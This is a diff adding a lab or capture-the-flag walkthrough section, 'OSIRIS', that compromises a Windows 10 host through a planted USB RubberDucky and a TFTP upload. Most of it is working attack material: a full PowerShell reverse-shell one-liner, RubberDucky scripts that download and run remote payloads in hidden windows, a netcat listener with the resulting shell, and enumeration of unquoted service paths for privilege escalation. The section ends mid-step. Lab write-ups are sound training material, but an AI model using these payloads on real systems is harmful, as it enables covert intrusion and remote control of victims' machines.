@@ -1432,9 +1432,214 @@ Don't be fooled by the error, indeed you will get a shell:
           SET
 
 
+# OSIRIS
+            
+     ██████  ███████ ██ ██████  ██ ███████ 
+    ██    ██ ██      ██ ██   ██ ██ ██      
+    ██    ██ ███████ ██ ██████  ██ ███████ 
+    ██    ██      ██ ██ ██   ██ ██      ██ 
+     ██████  ███████ ██ ██   ██ ██ ███████ 
+                                       
 
-          
+## Notes
+For the last challenge we need to abuse DPAPI. This is the time to get back the exported PFX file, containing the back-ip key, we took from the RA domain controller. In case you missed it I suggest to go back 
 
-         
+## Get a shell
+Here we don't need to perform any service discovery, since we have a TFTP service active on the victim, plus we manage to plug-in a RubberDucky stick on  Charlotte Johnson laptop, so we can execute RubberDucky scripts against the machine. Since I don't know anything about RD scripts, it's time to learn something new :). To get a reverse shell I followed this [tutorial](https://shop.hak5.org/blogs/usb-rubber-ducky/the-3-second-reverse-shell-with-a-usb-rubber-ducky). So I created the following reverse shell:
 
-          
+    cat rs.ps1   
+    $sm=(New-Object Net.Sockets.TCPClient("10.9.0.219",1234)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+
+ Then I created the corresponding RD script to execute it:
+
+    cat rds2rs.txt
+    
+    DELAY 1000
+    GUI r
+    DELAY 100
+    STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.9.0.219:8000/rs.ps1');"
+    ENTER
+
+Finally I started a netcat listener and I uploaded the script:
+
+    tftp 10.10.65.7 -v
+    Connected to 10.10.65.7 (10.10.65.7), port 69
+    tftp> put rds2rs.txt
+    putting rds2rs.txt to 10.10.65.7:rds2rs.txt [netascii]
+    Sent 138 bytes in 1.4 seconds [782 bit/s]
+
+Wait some time but no shell got back, so we can infer that maybe the payload was blocked. I tried to use [MalvasiaC](https://github.com/zinzloun/MalvasiaC) reverse shell. I modified the server IP to make it point to my VPN IP:
+
+    // configure here the server address and port
+	char *server_IP = "10.9.0.219";
+	int server_port = 1234;
+    
+I also had to change the RD script as follows to make it works:
+
+    DELAY 1000
+    GUI r
+    DELAY 1000
+    STRING powershell -W hidden
+    ENTER
+    DELAY 1000
+    ENTER
+    STRING Invoke-WebRequest http://10.9.0.219:8000/malvasia.exe -outfile c:\windows\temp\rs.exe
+    ENTER
+    DELAY 1000
+    STRING c:\windows\temp\rs.exe
+    ENTER
+    
+Then start a nc listener and uplod the script to the server:
+
+    tftp 10.10.65.7 -v
+    Connected to 10.10.65.7 (10.10.65.7), port 69
+    tftp> put rds2rs.txt
+    putting rds2rs.txt to 10.10.65.7:rs.txt [netascii]
+    Sent 235 bytes in 1.4 seconds [1323 bit/s]
+
+After a while I got a shell:
+
+    nc -lvp 1234
+    listening on [any] 1234 ...
+    10.10.65.7: inverse host lookup failed: Unknown host
+    connect to [10.9.0.219] from (UNKNOWN) [10.10.65.7] 51214
+    Windows PowerShell
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    
+    Try the new cross-platform PowerShell https://aka.ms/pscore6
+    
+    PS C:\Users\alcrez> whoami
+    whoami
+    windcorp\alcrez
+
+Running 
+
+    whoami /priv; whoami /groups
+
+I got some information about the system:
+
+    Get-ComputerInfo
+
+    WindowsBuildLabEx                                       : 19041.1.amd64fre.vb_release.191206-1406
+    WindowsCurrentVersion                                   : 6.3
+    WindowsEditionId                                        : Enterprise
+    WindowsInstallationType                                 : Client
+    WindowsInstallDateFromRegistry                          : 9/11/2020 5:34:20 PM
+    WindowsProductId                                        : 00329-00000-00003-AA786
+    WindowsProductName                                      : Windows 10 Enterprise
+    ...
+
+Then check installed .Net Framework:
+
+    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
+
+    PSChildName Version  
+    ----------- -------  
+    Client      4.8.04084
+    Full        4.8.04084
+    Client      4.0.0.0  
+
+Does not return any useful information. I use another RD script to download and execute winpeas:
+
+    DELAY 1000
+    GUI r
+    DELAY 1000
+    STRING powershell -W hidden
+    ENTER
+    DELAY 1000
+    ENTER
+    STRING Invoke-WebRequest http://10.9.0.219:8000/winPEAS.bat -outfile c:\windows\temp\wp.bat
+    ENTER
+    
+    ....
+    tftp> put wp.txt
+    putting wp.txt to 10.10.65.7:wp.txt [netascii]
+    Sent 186 bytes in 1.5 seconds [993 bit/s]
+
+Anyway winpeas is detected and removed from the server. Then we ahve to proceed using a manual approach. After some commands, looking for unquoted service paths:
+
+    Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
+    ...
+    Name            DisplayName     StartMode PathName                                     
+    ----            -----------     --------- --------                                     
+    IVPN Client     IVPN Client     Auto      C:\Program Files\IVPN Client\IVPN Service.exe
+    LSM             LSM             Unknown                                                
+    NetSetupSvc     NetSetupSvc     Unknown                                                
+    nordvpn-service nordvpn-service Auto      C:\Program Files\NordVPN\nordvpn-service.exe 
+
+Then we have to check wich permissions we have on IVPN Client folder:
+
+    get-acl -path "C:\Program Files\IVPN Client" | format-list
+
+    Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\IVPN Client
+    Owner  : BUILTIN\Administrators
+    Group  : 
+    Access : OSIRIS\scheduler Allow  Write, ReadAndExecute, Synchronize
+             NT SERVICE\TrustedInstaller Allow  FullControl
+             NT SERVICE\TrustedInstaller Allow  268435456
+             NT AUTHORITY\SYSTEM Allow  FullControl
+             NT AUTHORITY\SYSTEM Allow  268435456
+             BUILTIN\Administrators Allow  FullControl
+             BUILTIN\Administrators Allow  268435456
+             BUILTIN\Users Allow  ReadAndExecute, Synchronize
+             BUILTIN\Users Allow  -1610612736
+             CREATOR OWNER Allow  268435456
+            ....
+
+We dont' have write permission as current user. Let's check the service details:
+
+    Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *
+
+    
+    PSComputerName          : OSIRIS
+    Name                    : IVPN Client
+    Status                  : OK
+    ExitCode                : 0
+    DesktopInteract         : False
+    ErrorControl            : Normal
+    PathName                : C:\Program Files\IVPN Client\IVPN Service.exe
+    ServiceType             : Own Process
+    StartMode               : Auto
+    __GENUS                 : 2
+    __CLASS                 : Win32_Service
+    __SUPERCLASS            : Win32_BaseService
+    __DYNASTY               : CIM_ManagedSystemElement
+    __RELPATH               : Win32_Service.Name="IVPN Client"
+    __PROPERTY_COUNT        : 26
+    __DERIVATION            : {Win32_BaseService, CIM_Service, CIM_LogicalElement, CIM_ManagedSystemElement}
+    __SERVER                : OSIRIS
+    __NAMESPACE             : root\cimv2
+    __PATH                  : \\OSIRIS\root\cimv2:Win32_Service.Name="IVPN Client"
+    AcceptPause             : False
+    AcceptStop              : True
+    Caption                 : IVPN Client
+    CheckPoint              : 0
+    CreationClassName       : Win32_Service
+    DelayedAutoStart        : False
+    Description             : 
+    DisplayName             : IVPN Client
+    InstallDate             : 
+    ProcessId               : 3668
+    ServiceSpecificExitCode : 0
+    Started                 : True
+    StartName               : LocalSystem
+    State                   : Running
+    SystemCreationClassName : Win32_ComputerSystem
+    SystemName              : OSIRIS
+    ...
+
+The service is running as local system account that is perfect to escalate our privilege, plus the service can be restarted, let's verify:
+
+    PS C:\script> net stop "IVPN Client"; net start "IVPN Client"
+    The IVPN Client service is stopping.
+    The IVPN Client service was stopped successfully.
+
+    The IVPN Client service is starting.
+    The IVPN Client service was started successfully.
+
+Now we have to find a way to put a malicious exe into <b>C:\Program Files\IVPN Client folder</b>
+
+
+PS C:\script> echo "......" > C:\temp\log001.txt
+echo "......" > C:\temp\log001.txt
+
